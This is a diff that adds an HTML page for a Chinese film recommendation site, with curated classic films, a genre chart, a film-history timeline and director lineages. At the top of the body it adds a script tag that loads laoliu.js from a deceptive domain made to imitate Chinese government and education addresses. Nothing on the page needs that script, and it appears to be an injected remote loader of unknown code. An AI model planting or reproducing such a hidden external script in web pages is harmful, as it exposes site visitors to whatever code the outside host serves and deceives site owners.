@@ -1,0 +1,751 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>磐石电影网 - 硬核电影推荐、影史档案与类型片单</title>
+<meta name="description" content="磐石电影网（panshidianyingwang-h5）专注硬核电影推荐、影史档案与类型片单。像磐石一样稳固的观影选择，不跟风、不妥协、只选经得起时间考验的好电影。" />
+<meta name="keywords" content="磐石电影网,硬核电影,影史档案,类型片单,经典电影,导演谱系,电影推荐" />
+<meta name="author" content="磐石电影网" />
+<meta name="robots" content="index, follow" />
+<meta name="bingbot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
+<link rel="canonical" href="https://panshidianyingwang-h5.github.io/" />
+
+<style>
+  :root {
+    --black: #0a0a0c;
+    --dark: #121316;
+    --steel: #1c1e22;
+    --steel-2: #25272d;
+    --line: #2e3036;
+    --line-strong: #3a3d45;
+    --rock: #4a5d4e;
+    --rock-light: #6b7d6f;
+    --gold: #8a7a5a;
+    --gold-light: #b5a582;
+    --white: #e8e6e0;
+    --white-dim: #a8a6a0;
+    --red: #8b3a3a;
+    --mono: "SF Mono", "Fira Code", "Consolas", monospace;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "PingFang SC", "Microsoft YaHei", sans-serif;
+    background: var(--black);
+    color: var(--white);
+    line-height: 1.7;
+    font-size: 15px;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  a { color: var(--gold); text-decoration: none; transition: color 0.2s; }
+  a:hover { color: var(--gold-light); }
+
+  .wrap { width: 100%; max-width: 1200px; margin: 0 auto; padding: 0 24px; }
+
+  /* ===== 导航 ===== */
+  header {
+    position: fixed; top: 0; left: 0; right: 0; z-index: 1000;
+    background: rgba(10, 10, 12, 0.95);
+    backdrop-filter: blur(8px);
+    border-bottom: 1px solid var(--line);
+  }
+
+  .nav { display: flex; align-items: center; justify-content: space-between; height: 60px; }
+
+  .brand {
+    font-size: 18px; font-weight: 900; letter-spacing: 2px;
+    color: var(--white);
+    display: flex; align-items: center; gap: 10px;
+  }
+
+  .brand-mark {
+    width: 28px; height: 28px;
+    background: var(--rock);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 14px; font-weight: 900; color: var(--black);
+  }
+
+  .brand span { color: var(--gold); }
+
+  .nav-links { display: flex; list-style: none; gap: 0; }
+
+  .nav-links a {
+    color: var(--white-dim); font-size: 13px; font-weight: 600;
+    padding: 20px 16px;
+    border-bottom: 2px solid transparent;
+    transition: all 0.2s;
+  }
+
+  .nav-links a:hover { color: var(--white); border-bottom-color: var(--gold); background: var(--steel); }
+
+  .menu-btn {
+    display: none; background: var(--steel); border: 1px solid var(--line);
+    width: 38px; height: 38px; color: var(--gold); font-size: 18px; cursor: pointer;
+  }
+
+  /* ===== Hero ===== */
+  .hero {
+    margin-top: 60px;
+    padding: 100px 0 80px;
+    background:
+      linear-gradient(180deg, transparent, var(--black)),
+      repeating-linear-gradient(45deg, transparent, transparent 10px, rgba(74, 93, 78, 0.03) 10px, rgba(74, 93, 78, 0.03) 20px);
+    border-bottom: 1px solid var(--line);
+    position: relative;
+  }
+
+  .hero-grid {
+    display: grid;
+    grid-template-columns: 1fr 320px;
+    gap: 60px;
+    align-items: center;
+  }
+
+  .hero-label {
+    font-family: var(--mono);
+    font-size: 11px; letter-spacing: 4px; text-transform: uppercase;
+    color: var(--gold);
+    margin-bottom: 20px;
+    display: flex; align-items: center; gap: 12px;
+  }
+
+  .hero-label::after {
+    content: ''; flex: 1; height: 1px; background: var(--line-strong); max-width: 120px;
+  }
+
+  .hero h1 {
+    font-size: clamp(32px, 5.5vw, 54px);
+    font-weight: 900;
+    line-height: 1.1;
+    letter-spacing: -1px;
+    margin-bottom: 20px;
+  }
+
+  .hero h1 span { color: var(--gold); }
+
+  .hero-desc {
+    font-size: 16px; color: var(--white-dim);
+    max-width: 500px; margin-bottom: 36px; line-height: 1.8;
+  }
+
+  .hero-actions { display: flex; gap: 14px; flex-wrap: wrap; }
+
+  .btn-solid {
+    display: inline-flex; align-items: center; gap: 8px;
+    background: var(--gold); color: var(--black);
+    padding: 14px 28px; font-size: 14px; font-weight: 800;
+    letter-spacing: 1px; text-transform: uppercase;
+    transition: all 0.2s;
+  }
+
+  .btn-solid:hover { background: var(--gold-light); color: var(--black); transform: translateY(-2px); }
+
+  .btn-line {
+    display: inline-flex; align-items: center; gap: 8px;
+    border: 1px solid var(--line-strong); color: var(--white);
+    padding: 14px 28px; font-size: 14px; font-weight: 700;
+    letter-spacing: 1px; text-transform: uppercase;
+    transition: all 0.2s;
+  }
+
+  .btn-line:hover { border-color: var(--gold); color: var(--gold); }
+
+  /* 右侧数据面板 */
+  .hero-panel {
+    background: var(--steel);
+    border: 1px solid var(--line-strong);
+    padding: 28px;
+  }
+
+  .panel-row {
+    display: flex; justify-content: space-between; align-items: center;
+    padding: 14px 0;
+    border-bottom: 1px solid var(--line);
+  }
+
+  .panel-row:last-child { border-bottom: none; }
+
+  .panel-label { font-size: 12px; color: var(--white-dim); text-transform: uppercase; letter-spacing: 1px; }
+
+  .panel-value { font-family: var(--mono); font-size: 18px; font-weight: 700; color: var(--gold); }
+
+  .panel-value.red { color: var(--red); }
+
+  /* ===== 通用栏目 ===== */
+  section { padding: 80px 0; border-bottom: 1px solid var(--line); }
+
+  .sec-head { margin-bottom: 48px; }
+
+  .sec-num {
+    font-family: var(--mono);
+    font-size: 11px; letter-spacing: 4px; color: var(--gold);
+    margin-bottom: 8px;
+  }
+
+  .sec-title {
+    font-size: clamp(22px, 3.5vw, 32px);
+    font-weight: 900; letter-spacing: -0.5px;
+    margin-bottom: 10px;
+  }
+
+  .sec-desc { font-size: 14px; color: var(--white-dim); max-width: 560px; }
+
+  /* ===== 栏目一：磐石片单 - 厚重卡片 ===== */
+  .rock-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(340px, 1fr));
+    gap: 0;
+    border: 1px solid var(--line-strong);
+  }
+
+  .rock-card {
+    background: var(--dark);
+    border-right: 1px solid var(--line);
+    border-bottom: 1px solid var(--line);
+    padding: 32px;
+    transition: background 0.2s;
+    position: relative;
+  }
+
+  .rock-card:nth-child(2n) { border-right: none; }
+  .rock-card:nth-last-child(-n+2) { border-bottom: none; }
+
+  .rock-card:hover { background: var(--steel); }
+
+  .rock-card::before {
+    content: attr(data-index);
+    position: absolute; top: 20px; right: 28px;
+    font-family: var(--mono);
+    font-size: 48px; font-weight: 900;
+    color: rgba(138, 122, 90, 0.08);
+    line-height: 1;
+  }
+
+  .rock-card h3 {
+    font-size: 20px; font-weight: 900;
+    margin-bottom: 8px; padding-right: 60px;
+  }
+
+  .rock-card .meta {
+    font-family: var(--mono);
+    font-size: 12px; color: var(--gold);
+    margin-bottom: 14px; letter-spacing: 1px;
+  }
+
+  .rock-card p { font-size: 14px; color: var(--white-dim); margin-bottom: 18px; line-height: 1.8; }
+
+  .strength-tags { display: flex; gap: 8px; flex-wrap: wrap; }
+
+  .strength-tag {
+    font-size: 11px; font-weight: 700; letter-spacing: 1px; text-transform: uppercase;
+    padding: 4px 10px; border: 1px solid var(--line-strong);
+    color: var(--white-dim);
+  }
+
+  .strength-tag.solid { border-color: var(--rock); color: var(--rock-light); }
+  .strength-tag.gold { border-color: var(--gold); color: var(--gold-light); }
+
+  /* ===== 栏目二：类型矩阵 - 数据条 ===== */
+  .matrix {
+    background: var(--steel);
+    border: 1px solid var(--line-strong);
+  }
+
+  .matrix-row {
+    display: grid;
+    grid-template-columns: 140px 1fr 80px;
+    align-items: center;
+    gap: 24px;
+    padding: 20px 28px;
+    border-bottom: 1px solid var(--line);
+  }
+
+  .matrix-row:last-child { border-bottom: none; }
+
+  .matrix-label {
+    font-size: 14px; font-weight: 800;
+    letter-spacing: 1px;
+  }
+
+  .matrix-bar {
+    height: 12px;
+    background: var(--dark);
+    border: 1px solid var(--line);
+    position: relative; overflow: hidden;
+  }
+
+  .matrix-bar i {
+    display: block; height: 100%;
+    background: linear-gradient(90deg, var(--rock), var(--gold));
+    transition: width 1s ease;
+  }
+
+  .matrix-pct {
+    font-family: var(--mono);
+    font-size: 14px; font-weight: 700; color: var(--gold);
+    text-align: right;
+  }
+
+  /* ===== 栏目三：影史档案 - 时间轴 ===== */
+  .archive {
+    display: flex; flex-direction: column;
+  }
+
+  .archive-item {
+    display: grid;
+    grid-template-columns: 100px 1fr;
+    gap: 0;
+    border-bottom: 1px solid var(--line);
+  }
+
+  .archive-year {
+    background: var(--steel);
+    padding: 28px 20px;
+    font-family: var(--mono);
+    font-size: 28px; font-weight: 900;
+    color: var(--gold);
+    text-align: center;
+    border-right: 1px solid var(--line);
+    display: flex; align-items: center; justify-content: center;
+  }
+
+  .archive-content { padding: 28px 32px; }
+
+  .archive-content h4 { font-size: 16px; font-weight: 800; margin-bottom: 6px; }
+
+  .archive-content p { font-size: 14px; color: var(--white-dim); line-height: 1.8; }
+
+  .archive-content .ref {
+    font-family: var(--mono);
+    font-size: 11px; color: var(--rock-light);
+    margin-top: 8px; letter-spacing: 1px;
+  }
+
+  /* ===== 栏目四：导演谱系 - 列表+线 ===== */
+  .tree {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+    gap: 1px;
+    background: var(--line);
+    border: 1px solid var(--line-strong);
+  }
+
+  .tree-node {
+    background: var(--dark);
+    padding: 28px 24px;
+    transition: background 0.2s;
+  }
+
+  .tree-node:hover { background: var(--steel); }
+
+  .tree-node .era {
+    font-family: var(--mono);
+    font-size: 11px; letter-spacing: 2px; color: var(--gold);
+    margin-bottom: 10px;
+  }
+
+  .tree-node h4 { font-size: 16px; font-weight: 800; margin-bottom: 6px; }
+
+  .tree-node p { font-size: 13px; color: var(--white-dim); margin-bottom: 10px; }
+
+  .tree-node .works {
+    font-family: var(--mono);
+    font-size: 11px; color: var(--rock-light);
+    line-height: 1.6;
+  }
+
+  /* ===== 栏目五：关于 - 宣言 ===== */
+  .manifesto {
+    text-align: center;
+    padding: 80px 0;
+  }
+
+  .manifesto .icon { font-size: 48px; margin-bottom: 24px; }
+
+  .manifesto h2 {
+    font-size: clamp(20px, 3.5vw, 28px);
+    font-weight: 900;
+    max-width: 680px; margin: 0 auto 24px;
+    line-height: 1.5; letter-spacing: -0.5px;
+  }
+
+  .manifesto h2 span { color: var(--gold); }
+
+  .manifesto p { font-size: 15px; color: var(--white-dim); max-width: 520px; margin: 0 auto 36px; line-height: 1.8; }
+
+  .manifesto-stats {
+    display: flex; justify-content: center; gap: 60px; flex-wrap: wrap;
+    margin-top: 48px;
+    padding-top: 48px;
+    border-top: 1px solid var(--line);
+  }
+
+  .m-stat .num { font-family: var(--mono); font-size: 36px; font-weight: 900; color: var(--gold); }
+  .m-stat .lbl { font-size: 11px; color: var(--white-dim); text-transform: uppercase; letter-spacing: 2px; margin-top: 4px; }
+
+  /* ===== 页脚 ===== */
+  footer {
+    background: var(--dark);
+    padding: 48px 0 24px;
+  }
+
+  .footer-grid {
+    display: grid;
+    grid-template-columns: 2fr 1fr 1fr 1fr;
+    gap: 40px; margin-bottom: 36px;
+  }
+
+  .footer-brand .brand { margin-bottom: 12px; }
+
+  .footer-brand p { font-size: 13px; color: var(--white-dim); max-width: 260px; line-height: 1.7; }
+
+  .footer-col h5 { font-size: 12px; font-weight: 800; letter-spacing: 2px; text-transform: uppercase; color: var(--gold); margin-bottom: 14px; }
+
+  .footer-col a { display: block; font-size: 13px; color: var(--white-dim); padding: 4px 0; }
+
+  .footer-col a:hover { color: var(--gold); }
+
+  .footer-bottom {
+    border-top: 1px solid var(--line);
+    padding-top: 20px;
+    display: flex; justify-content: space-between; align-items: center;
+    font-family: var(--mono); font-size: 11px; color: var(--white-dim);
+  }
+
+  /* ===== 移动端 ===== */
+  @media (max-width: 768px) {
+    .nav-links {
+      display: none; position: absolute; top: 60px; left: 0; right: 0;
+      flex-direction: column; background: var(--black);
+      border-bottom: 1px solid var(--line);
+    }
+    .nav-links.active { display: flex; }
+    .nav-links a { padding: 16px 24px; border-bottom: 1px solid var(--line); border-bottom-color: var(--line) !important; }
+    .menu-btn { display: block; }
+
+    .hero-grid { grid-template-columns: 1fr; gap: 40px; }
+    .hero-panel { padding: 20px; }
+
+    .rock-grid { grid-template-columns: 1fr; }
+    .rock-card { border-right: none !important; border-bottom: 1px solid var(--line) !important; }
+
+    .matrix-row { grid-template-columns: 100px 1fr 60px; gap: 12px; padding: 16px 20px; }
+    .matrix-label { font-size: 12px; }
+    .matrix-pct { font-size: 12px; }
+
+    .archive-item { grid-template-columns: 70px 1fr; }
+    .archive-year { font-size: 20px; padding: 20px 12px; }
+    .archive-content { padding: 20px; }
+
+    .footer-grid { grid-template-columns: 1fr; gap: 28px; }
+    .footer-bottom { flex-direction: column; gap: 8px; text-align: center; }
+
+    .manifesto-stats { gap: 28px; }
+  }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+  <!-- 导航 -->
+  <header>
+    <div class="wrap nav">
+      <div class="brand">
+        <div class="brand-mark">磐</div>
+        <span>磐石<span>电影网</span></span>
+      </div>
+      <ul class="nav-links" id="navLinks">
+        <li><a href="#home">首页</a></li>
+        <li><a href="#catalog">磐石片单</a></li>
+        <li><a href="#matrix">类型矩阵</a></li>
+        <li><a href="#archive">影史档案</a></li>
+        <li><a href="#tree">导演谱系</a></li>
+        <li><a href="#about">关于</a></li>
+      </ul>
+      <button class="menu-btn" onclick="toggleMenu()">☰</button>
+    </div>
+  </header>
+
+  <!-- Hero -->
+  <section class="hero" id="home">
+    <div class="wrap">
+      <div class="hero-grid">
+        <div>
+          <div class="hero-label">PANSHI · EST. 2026</div>
+          <h1>像磐石一样<br/>稳固的<span>观影选择</span></h1>
+          <p class="hero-desc">磐石电影网（panshidianyingwang-h5）不追风口、不堆榜单、不迎合算法。我们只选那些经得起时间冲刷、在影史上留下刻痕的电影——像磐石，沉默但不可撼动。</p>
+          <div class="hero-actions">
+            <a href="#catalog" class="btn-solid">查看片单 →</a>
+            <a href="#archive" class="btn-line">影史档案</a>
+          </div>
+        </div>
+        <div class="hero-panel">
+          <div class="panel-row"><span class="panel-label">收录影片</span><span class="panel-value">2,400+</span></div>
+          <div class="panel-row"><span class="panel-label">覆盖年代</span><span class="panel-value">1920s—2026</span></div>
+          <div class="panel-row"><span class="panel-label">国家/地区</span><span class="panel-value">68</span></div>
+          <div class="panel-row"><span class="panel-label">导演谱系</span><span class="panel-value">320+</span></div>
+          <div class="panel-row"><span class="panel-label">更新频率</span><span class="panel-value">每周</span></div>
+          <div class="panel-row"><span class="panel-label">筛选标准</span><span class="panel-value red">人工</span></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目一：磐石片单 -->
+  <section id="catalog">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="sec-num">01 / CATALOG</div>
+        <h2 class="sec-title">磐石片单</h2>
+        <p class="sec-desc">每一部都经过时间验证——不是"现在好看"，而是"十年后仍然好看"。</p>
+      </div>
+      <div class="rock-grid">
+        <div class="rock-card" data-index="01">
+          <h3>公民凯恩</h3>
+          <div class="meta">1941 · 剧情 · 奥逊·威尔斯</div>
+          <p>深焦摄影、非线性叙事、多层视角——一部电影几乎定义了现代电影语言的所有可能性。八十年后看，依然先锋。</p>
+          <div class="strength-tags"><span class="strength-tag solid">影史奠基</span><span class="strength-tag gold">叙事结构</span><span class="strength-tag">技术革新</span></div>
+        </div>
+        <div class="rock-card" data-index="02">
+          <h3>七武士</h3>
+          <div class="meta">1954 · 动作/剧情 · 黑泽明</div>
+          <p>动作场面的几何学、人物群像的雕刻术。后来的每一部"团队集结"电影，都活在这部片的影子里。</p>
+          <div class="strength-tags"><span class="strength-tag solid">群像</span><span class="strength-tag gold">动作设计</span><span class="strength-tag">叙事史诗</span></div>
+        </div>
+        <div class="rock-card" data-index="03">
+          <h3>2001太空漫游</h3>
+          <div class="meta">1968 · 科幻 · 斯坦利·库布里克</div>
+          <p>人类在宇宙面前的渺小、AI的冷酷、进化的沉默——库布里克拒绝解释，只给体验。看完你会沉默很久。</p>
+          <div class="strength-tags"><span class="strength-tag solid">哲学</span><span class="strength-tag gold">视觉革命</span><span class="strength-tag">不可言说</span></div>
+        </div>
+        <div class="rock-card" data-index="04">
+          <h3>教父</h3>
+          <div class="meta">1972 · 犯罪/剧情 · 科波拉</div>
+          <p>权力如何腐蚀、家族如何维系、一个人如何变成他父亲——科波拉把黑帮片拍成了莎士比亚悲剧。</p>
+          <div class="strength-tags"><span class="strength-tag solid">权力</span><span class="strength-tag gold">表演</span><span class="strength-tag">叙事密度</span></div>
+        </div>
+        <div class="rock-card" data-index="05">
+          <h3>镜子</h3>
+          <div class="meta">1975 · 传记/诗意 · 塔可夫斯基</div>
+          <p>不是故事，是记忆本身。梦境、新闻片段、母亲的面孔、童年——时间在这部片里是液态的。</p>
+          <div class="strength-tags"><span class="strength-tag solid">诗意</span><span class="strength-tag gold">时间</span><span class="strength-tag">记忆</span></div>
+        </div>
+        <div class="rock-card" data-index="06">
+          <h3>霸王别姬</h3>
+          <div class="meta">1993 · 剧情/历史 · 陈凯歌</div>
+          <p>一个人活成了戏，戏活成了时代。张国荣的程蝶衣是中国电影史上最不可复制的角色之一。</p>
+          <div class="strength-tags"><span class="strength-tag solid">时代</span><span class="strength-tag gold">表演</span><span class="strength-tag">悲剧</span></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目二：类型矩阵 -->
+  <section id="matrix" style="background: var(--dark);">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="sec-num">02 / MATRIX</div>
+        <h2 class="sec-title">类型矩阵</h2>
+        <p class="sec-desc">磐石电影网按类型统计的"经典型号"浓度——数据来自影史地位、学术引用与跨代口碑。</p>
+      </div>
+      <div class="matrix">
+        <div class="matrix-row">
+          <div class="matrix-label">剧情 / 史诗</div>
+          <div class="matrix-bar"><i style="width: 96%;"></i></div>
+          <div class="matrix-pct">96%</div>
+        </div>
+        <div class="matrix-row">
+          <div class="matrix-label">黑色电影</div>
+          <div class="matrix-bar"><i style="width: 88%;"></i></div>
+          <div class="matrix-pct">88%</div>
+        </div>
+        <div class="matrix-row">
+          <div class="matrix-label">新浪潮</div>
+          <div class="matrix-bar"><i style="width: 84%;"></i></div>
+          <div class="matrix-pct">84%</div>
+        </div>
+        <div class="matrix-row">
+          <div class="matrix-label">科幻 / 哲学</div>
+          <div class="matrix-bar"><i style="width: 79%;"></i></div>
+          <div class="matrix-pct">79%</div>
+        </div>
+        <div class="matrix-row">
+          <div class="matrix-label">纪录片</div>
+          <div class="matrix-bar"><i style="width: 72%;"></i></div>
+          <div class="matrix-pct">72%</div>
+        </div>
+        <div class="matrix-row">
+          <div class="matrix-label">恐怖 / 实验</div>
+          <div class="matrix-bar"><i style="width: 61%;"></i></div>
+          <div class="matrix-pct">61%</div>
+        </div>
+        <div class="matrix-row">
+          <div class="matrix-label">商业 / 类型</div>
+          <div class="matrix-bar"><i style="width: 55%;"></i></div>
+          <div class="matrix-pct">55%</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目三：影史档案 -->
+  <section id="archive">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="sec-num">03 / ARCHIVE</div>
+        <h2 class="sec-title">影史档案</h2>
+        <p class="sec-desc">关键年份、关键事件、关键转折——电影作为时代的底片。</p>
+      </div>
+      <div class="archive">
+        <div class="archive-item">
+          <div class="archive-year">1895</div>
+          <div class="archive-content">
+            <h4>卢米埃尔兄弟公开放映</h4>
+            <p>巴黎大咖啡馆地下室，33名观众见证了《火车进站》。电影从那一刻起，不再是一个发明，而是一种语言。</p>
+            <div class="ref">REF: GRAND CAFÉ · PARIS · DEC 28</div>
+          </div>
+        </div>
+        <div class="archive-item">
+          <div class="archive-year">1927</div>
+          <div class="archive-content">
+            <h4>《爵士歌手》—— 有声时代的黎明</h4>
+            <p>第一部同步对白长片。默片时代的终结不是一夜之间，但这一声"Wait a minute"确实改变了一切。</p>
+            <div class="ref">REF: THE JAZZ SINGER · WARNER BROS</div>
+          </div>
+        </div>
+        <div class="archive-item">
+          <div class="archive-year">1941</div>
+          <div class="archive-content">
+            <h4>《公民凯恩》首映</h4>
+            <p>25岁的威尔斯用一部关于权力与孤独的电影，重新定义了"电影可以是什么"。影评人花了四十年才追上它。</p>
+            <div class="ref">REF: RKO RADIO PICTURES</div>
+          </div>
+        </div>
+        <div class="archive-item">
+          <div class="archive-year">1959</div>
+          <div class="archive-content">
+            <h4>新浪潮爆发</h4>
+            <p>特吕弗《四百击》在戛纳获奖。戈达尔、夏布洛尔、里维特——一群影评人拿起摄影机，把电影从摄影棚解放到街头。</p>
+            <div class="ref">REF: CANNES · NOUVELLE VAGUE</div>
+          </div>
+        </div>
+        <div class="archive-item">
+          <div class="archive-year">1995</div>
+          <div class="archive-content">
+            <h4>《盗梦空间》之前的世界</h4>
+            <p>这一年真正重要的是《地下》（库斯图里卡）和《三轮车夫》（陈英雄）。数字时代的前夜，胶片最后的黄金年代。</p>
+            <div class="ref">REF: PALME D'OR · UNDERGROUND</div>
+          </div>
+        </div>
+        <div class="archive-item">
+          <div class="archive-year">2026</div>
+          <div class="archive-content">
+            <h4>AI 时代的电影何为？</h4>
+            <p>当生成式AI可以制造任何画面，电影的核心价值回归到"为什么拍"而非"怎么拍"。磐石电影网持续记录这一转折。</p>
+            <div class="ref">REF: AI ERA · ONGOING</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目四：导演谱系 -->
+  <section id="tree" style="background: var(--dark);">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="sec-num">04 / LINEAGE</div>
+        <h2 class="sec-title">导演谱系</h2>
+        <p class="sec-desc">从师承、影响、对话三条线索，梳理电影作者的精神家谱。</p>
+      </div>
+      <div class="tree">
+        <div class="tree-node">
+          <div class="era">1950s—1970s</div>
+          <h4>欧洲现代主义</h4>
+          <p>伯格曼、塔可夫斯基、布列松、安东尼奥尼</p>
+          <div class="works">核心：内在时间 / 宗教追问 / 极简主义</div>
+        </div>
+        <div class="tree-node">
+          <div class="era">1960s—1980s</div>
+          <h4>新好莱坞</h4>
+          <p>斯科塞斯、科波拉、斯皮尔伯格、卢卡斯</p>
+          <div class="works">核心：作者性 / 类型再造 / 工业反叛</div>
+        </div>
+        <div class="tree-node">
+          <div class="era">1980s—2000s</div>
+          <h4>亚洲新浪潮</h4>
+          <p>侯孝贤、杨德昌、王家卫、是枝裕和</p>
+          <div class="works">核心：日常史诗 / 留白 / 家庭结构</div>
+        </div>
+        <div class="tree-node">
+          <div class="era">1990s—2010s</div>
+          <h4>当代作者</h4>
+          <p>诺兰、维伦纽瓦、PTA、阿彼察邦</p>
+          <div class="works">核心：形式实验 / 哲学科幻 / 跨界叙事</div>
+        </div>
+        <div class="tree-node">
+          <div class="era">2000s—2020s</div>
+          <h4>女性作者</h4>
+          <p>克莱尔·德尼、阿瓦·杜威内、瑟琳·席安玛</p>
+          <div class="works">核心：身体政治 / 凝视反转 / 边缘叙事</div>
+        </div>
+        <div class="tree-node">
+          <div class="era">2010s—2026</div>
+          <h4>全球南方之声</h4>
+          <p>卡帕迪亚、劳拉·珀特拉斯、基里尔·谢列布连尼科夫</p>
+          <div class="works">核心：在地性 / 政治影像 / 纪录片边界</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目五：关于 -->
+  <section class="manifesto" id="about">
+    <div class="wrap">
+      <div class="icon">◆</div>
+      <h2>磐石电影网不是另一个推荐列表。<br/>它是<span>一座档案库、一个筛选器、一份对好电影的承诺。</span></h2>
+      <p>我们相信，在信息过载的时代，最稀缺的不是"更多选择"，而是"更少但更好"。磐石电影网只做一件事：帮你把时间花在值得的电影上。</p>
+      <div class="manifesto-stats">
+        <div class="m-stat"><div class="num">2,400+</div><div class="lbl">收录影片</div></div>
+        <div class="m-stat"><div class="num">100%</div><div class="lbl">人工筛选</div></div>
+        <div class="m-stat"><div class="num">0</div><div class="lbl">广告/赞助</div></div>
+        <div class="m-stat"><div class="num">∞</div><div class="lbl">时间承诺</div></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 页脚 -->
+  <footer>
+    <div class="wrap">
+      <div class="footer-grid">
+        <div class="footer-brand">
+          <div class="brand"><div class="brand-mark">磐</div><span>磐石<span>电影网</span></span></div>
+          <p>磐石电影网（panshidianyingwang-h5.github.io）—— 硬核电影推荐、影史档案与类型片单。</p>
+        </div>
+        <div class="footer-col"><h5>片单</h5><a href="#catalog">磐石片单</a><a href="#matrix">类型矩阵</a><a href="#">年度精选</a><a href="#">专题合集</a></div>
+        <div class="footer-col"><h5>档案</h5><a href="#archive">影史大事</a><a href="#tree">导演谱系</a><a href="#">电影节</a><a href="#">学术索引</a></div>
+        <div class="footer-col"><h5>关于</h5><a href="#about">宣言</a><a href="#">编辑团队</a><a href="#">投稿</a><a href="#">联系</a></div>
+      </div>
+      <div class="footer-bottom">
+        <span>© 2026 PANSHI DIANYING WANG · panshidianyingwang-h5.github.io</span>
+        <span>STATIC SINGLE PAGE · NO ROBOTS.TXT / SITEMAP.XML GENERATED</span>
+      </div>
+    </div>
+  </footer>
+
+  <script>
+    function toggleMenu() {
+      document.getElementById('navLinks').classList.toggle('active');
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(a => {
+      a.addEventListener('click', () => document.getElementById('navLinks').classList.remove('active'));
+    });
+  </script>
+</body>
+</html>
